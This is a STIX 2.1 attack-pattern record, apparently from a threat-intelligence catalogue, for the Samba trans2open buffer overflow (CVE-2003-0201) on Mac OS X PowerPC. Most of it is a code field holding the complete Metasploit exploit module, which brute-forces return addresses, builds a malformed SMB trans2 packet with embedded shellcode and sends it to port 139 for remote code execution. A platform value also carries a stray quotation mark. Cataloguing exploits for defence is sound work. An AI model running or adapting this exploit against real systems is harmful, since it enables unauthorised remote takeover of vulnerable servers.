{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a345c178-a802-4490-84df-9b4ac0ff2b25",
    "created": "2024-08-14T16:34:14.646735Z",
    "modified": "2024-08-14T16:34:14.64674Z",
    "name": "Samba trans2open Overflow (Mac OS X PPC)",
    "description": " This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the bug on Mac OS X PowerPC systems. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/samba/trans2open.rb",
            "external_id": "trans2open.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0201"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2003/Apr/103"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba trans2open Overflow (Mac OS X PPC)',\n      'Description'    => %q{\n          This exploits the buffer overflow found in Samba versions\n        2.2.0 to 2.2.8. This particular module is capable of\n        exploiting the bug on Mac OS X PowerPC systems.\n      },\n      'Author'         => [ 'hdm', 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2003-0201' ],\n          [ 'OSVDB', '4469' ],\n          [ 'BID', '7294' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2003/Apr/103' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'MinNops'  => 512,\n        },\n      'Platform'       => 'osx',\n      'Arch'           => ARCH_PPC,\n      'Targets'        =>\n        [\n          [ 'Samba 2.2.x - Bruteforce',\n            {\n              # Not necessary on PPC\n              # 'PtrToNonZero' => 0xbffffff4, # near the bottom of the stack\n              'Offset'       => 1195,\n              'Bruteforce'   =>\n                {\n                  'Start' => { 'Ret' => 0xbffffdfc },\n                  'Stop'  => { 'Ret' => 0xbfa00000 },\n                  'Step'  => 512\n                }\n            }\n          ]\n        ],\n      'DisclosureDate' => '2003-04-07',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(139)\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  # Need to perform target detection\n  def autofilter\n    false\n  end\n\n  def brute_exploit(addrs)\n\n    curr_ret = addrs['Ret']\n    begin\n      print_status(\"Trying return address 0x%.8x...\" %  curr_ret)\n\n      connect(versions: [1])\n      smb_login\n\n      # 1988 is required for findrecv shellcode\n      pattern = rand_text_english(1988)\n\n      # This stream covers the framepointer and the return address\n      off = target['Offset']\n      pattern[off, 64] = [curr_ret].pack('N') * 16\n\n      # Stuff the shellcode into the request\n      pattern[3, payload.encoded.length] = payload.encoded\n\n      trans =\n        \"\\x00\\x04\\x08\\x20\\xff\\x53\\x4d\\x42\\x32\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"+\n        \"\\x64\\x00\\x00\\x00\\x00\\xd0\\x07\\x0c\\x00\\xd0\\x07\\x0c\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd0\\x07\\x43\\x00\\x0c\\x00\\x14\\x08\\x01\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\"+\n        pattern\n\n      sock.put(trans)\n      handler\n      disconnect\n\n    rescue EOFError\n    rescue => e\n      print_error(e.to_s)\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-04-07",
    "x_mitre_platforms": [
        "osx'"
    ]
}